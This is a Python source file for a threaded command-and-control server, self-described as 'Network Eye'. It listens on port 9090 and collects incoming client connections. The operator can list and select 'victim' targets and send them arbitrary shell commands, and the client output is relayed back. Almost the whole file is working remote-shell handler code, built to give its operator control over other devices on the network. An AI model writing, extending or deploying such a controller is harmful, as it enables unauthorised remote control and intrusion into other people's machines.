import socket
import sys #SYS enables one to run system commands
import threading
import time
from queue import Queue
import os
import subprocess
import threading

#Establish a connetion witha client. (Socket must be listening to connections)
all_connections = []
all_addresses= []

#Creating a Socket (Will enable the communications of two computers)
def SeverSocket():
	try:
		global host
		global port
		global sckt 
		host = ''
		port = 9090
		sckt = socket.socket()
	except socket.error as scktCreationErrorMsg:
		print(f"An error was encountered during Socket Creation: {scktErrorMsg}")
	else:
		print("\033[34mSocket was created as succesfull\033[0m")

#Bind the Socket to the port and wait for connection from a machine
def SocketBind():
	try:
		global host
		global port
		global sckt
		sckt.bind((host, port))
		print("\033[34mBinding Socket to port: \033[0m"+str(port))
		
		sckt.listen(5) #Listen allows your server to listen to connections available. 5 refers to the max number of connections
	except socket.error as scktBindErrorMsg:
		print(f"An error was encountered during Binding Socket to port: {scktBindErrorMsg}"+"\n"+"Retrying...")
		time.sleep(5)
		SocketBind()
	else:
		print("\033[34mBinding Socket to port was succesful\033[0m")
		print("\033[34mServer is now listening for connections\033[0m")
		

#Accept multiple client connections and save to list
def accept_connections():
	for c in all_connections:
		c.close()#close all connections incase we want other clients to connect
	del all_connections[:]
	del all_addresses[:]
	while 1:#As long as the client script is running, whenever a client connects, we accept....... the connection and add to the list.
		try:
			conn, address = sckt.accept()
			conn.setblocking(1)
			all_connections.append(conn)
			all_addresses.append(address)
			print("\nConnection has been established with : " + address[0])
			print("Type ===== List ===== to view connected clients")
		except:
			print("\nError establishing a connection with client")

#Send commands to victim
#use thread two --- create an interace prompt to send commands to client\
def start_neteye():
	print("\033[1m\033[33mStarting Netye .......................................\033[0m")
	time.sleep(1)#Waiting for other threads to execute
	while True:
		cmd = input("\033[31mnetmatta >\033[0m")
		if cmd == 'list':
			list_connections()
		elif cmd == 'Help':
			help()
		elif 'select' in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_target_commands(conn)
		elif cmd == 'exit':
			import logo
		else:
			print("Command not recognized")

#Display all current connections
def list_connections():
	results = ''
	for i, conn in enumerate(all_connections):
		try:
			conn.send(str.encode(' '))
			conn.recv(20480)
		except:
			del all_connections[i]
			del all_addresses[i]
			continue
		results += str(i)+'   ' + str(all_addresses[i][0]) + '   '+str(all_addresses[i][1])+'\n'
	print("----------CLIENTS--------"+"\n"+results)

#Select a Target Client
def get_target(cmd):
	try:
		target = cmd.replace('select ', '')
		target = int(target)
		conn = all_connections[target]
		print(f"You are now connected to  + \033[31m{str(all_addresses[target][0])}\033[0m")
		print(str(all_addresses[target][0]) + '> ', end="")
		return conn
	except:
		print("Not a valid selection")
		return None

#Connect to a remote client Computer

def send_target_commands(conn):
	while True:
		try:
			cmd = input()
			if len (str.encode(cmd)) > 0:
				conn.send(str.encode(cmd))
				client_response = str(conn.recv(20480), "utf-8")
				print(client_response, end="")
			if cmd == 'quit':
				break
			if cmd == 'Help':
				help()
		except:
			print("connection was lost with client")
			break 


#HELP FUNCTION

def help():
	print()
	print("WELCOME TO NETWORK EYE")
	print("A tool that gives you control on other devices on the network")


#Creating Threads 
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()

def create_workers():
	for _ in range (NUMBER_OF_THREADS):
		t = threading.Thread(target = work)
		t.daemon = True
		t.start()

#Assigning tasks to the threads
def work():
	while True:
		x = queue.get()
		if x == 1:
			SeverSocket()
			SocketBind()
			accept_connections()
			
		if x == 2:
			start_neteye()
		queue.task_done()

#Each list item is a new job
def create_jobs():
	for x in JOB_NUMBER:
		queue.put(x)
	queue.join()

create_workers()
create_jobs()
